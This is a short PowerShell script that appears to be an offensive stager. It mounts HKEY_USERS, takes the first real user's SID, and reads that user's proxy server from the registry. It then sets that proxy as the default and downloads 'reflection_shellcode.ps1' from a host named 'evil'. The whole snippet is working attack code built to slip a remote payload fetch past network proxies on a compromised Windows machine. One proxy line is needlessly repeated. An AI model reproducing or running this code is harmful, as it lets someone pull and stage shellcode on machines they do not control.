# Resolving HKEY_USERS registry
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null

# Next we must find a valid SID user in order to get his proxy config
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}

# Then we grab the content of the reg key
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer

# Turning the result into a Proxy Object
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://evil/reflection_shellcode.ps1")
